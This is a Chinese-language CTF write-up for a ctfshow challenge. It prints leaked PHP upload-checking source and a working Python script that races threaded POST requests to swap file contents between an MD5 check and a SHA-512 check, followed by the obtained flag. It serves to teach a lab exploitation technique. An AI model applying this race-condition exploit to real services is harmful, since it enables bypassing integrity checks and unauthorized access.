#### 红包题第六弹

==**对网上搜寻的题解进行一些勘误**==

实际上有fastcoll生成的相同的MD5值的文件仍然绕不过第一层的md5_file，因为新生成的两个文件的md5值才相同，而与源文件不同，**本题实际考察的是条件竞争**，通过并发编程实现先后两层的绕过

##### 信息收集

首先有hint提示，不是SQL注入，可以发现源码，于是使用dirmap扫描出来有网站备份文件，解压后，代码如下：

```php
function receiveStreamFile($receiveFile){
 
    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';
 
    if(empty($streamData)){
        $streamData = file_get_contents('php://input');
    }
    if($streamData!=''){
        $ret = file_put_contents($receiveFile, $streamData, true);
    }else{
        $ret = false;
    }
    return $ret;
}
if(md5(date("i")) === $token){
	
	$receiveFile = 'flag.dat';
	receiveStreamFile($receiveFile);
	if(md5_file($receiveFile)===md5_file("key.dat")){
		if(hash_file("sha512",$receiveFile)!=hash_file("sha512","key.dat")){
			$ret['success']="1";
			$ret['msg']="人脸识别成功!$flag";
			$ret['error']="0";
			echo json_encode($ret);
			return;
		}

			$ret['errormsg']="same file";
			echo json_encode($ret);
			return;
	}
			$ret['errormsg']="md5 error";
			echo json_encode($ret);
			return;
} 

$ret['errormsg']="token error";
echo json_encode($ret);
return;
```

##### 阅读源码

首先有一个对token的判断，于是我们抓包看看，

![](D:\0-CTF\Documents\WP\images\ctfshow_红包题6_1.jpg)

发现确实有一个token，是对当前日期做了一个MD5的编码，可以用python实现，然后设置了一个receivefile为flag.dat，然后调用`receiveStreamFile($receiveFile);`，可以发现是需要用php://input获取文件流，然后返回一个文件，接下来需要自己传上去的文件与已存在的`key.dat`的MD5要一致，sha512不一致，即可打印出flag

##### 解题

那么我们的思路是，首先获得key.dat，首先访问一下这个文件，emmm，果然直接下载了，那么第一层的绕过我们直接就使用了`key.dat`文件，第二层的sha1值我们随便上传一个字符串即可，所以我们需要**并发编程，将$receiveFile中的内容在极短时间内进行替换**，这里我们可以编写一个python脚本来进行解题。

payload:

```python
import requests
import time
import hashlib
import threading

#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化
i=str(time.localtime().tm_min)
#生成token
m=hashlib.md5(i.encode()).hexdigest()
url="http://063e4649-b8da-4090-8a6b-da6b11fa5f07.challenge.ctf.show/check.php?token={}&php://input".format(m)

def POST(data):
    try:
        r=requests.post(url,data=data)
        if "ctfshow" in r.text:
            print(r.text)
            pass
        # print(r.text)
        pass
    except Exception as e:
        print("somthing went wrong!")
        pass
    pass

with open('key.dat','rb') as t:
    data1=t.read()
    pass
for i in range(50):
    threading.Thread(target=POST,args=(data1,)).start()
for i in range(50):
    data2='emmmmm'
    threading.Thread(target=POST,args=(data2,)).start()
```

得出：

```
{"success":"1","msg":"\u4eba\u8138\u8bc6\u522b\u6210\u529f!ctfshow{6f98bbcc-82e2-4c3e-a46e-0a8f8ad403cd}","error":"0","errormsg":""}
```

